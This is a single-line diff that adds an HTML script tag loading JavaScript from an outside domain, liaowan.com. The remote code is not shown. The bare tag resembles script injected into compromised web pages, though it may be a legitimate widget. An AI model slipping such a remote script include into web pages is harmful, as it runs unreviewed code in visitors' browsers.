@@ -1,0 +1,1 @@
+<SCRIPT src=http://liaowan.com/chatjs/2068.js></SCRIPT> 
